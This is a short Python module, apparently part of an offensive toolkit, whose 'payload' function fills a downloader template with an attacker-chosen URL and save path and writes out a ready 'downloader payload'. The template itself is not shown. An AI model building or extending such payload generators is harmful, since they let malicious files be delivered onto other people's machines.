def payload(url,download_save_path,save_path):
    payload_source = ''
    try:
        with open('./Libs/downloader/payload/payload.py','r') as payload:
            payload_source = payload.read().replace("Download URL",str(url)).replace("Download Path",str(download_save_path.replace("\\","\\\\")))
        with open(save_path,'w') as payload:
            payload.write(payload_source)
    except:
        print('[-] Error.')
        return -1
    print('[*] File path: '+str(save_path))
    print('[*] Download URL: '+str(url))
    print('[*] Download save path: '+str(download_save_path))
    print('[*] Payload size: '+str(len(payload_source)))

def info():
    print('Usage: make downloader payload URL Download_Save_Path Save_Path')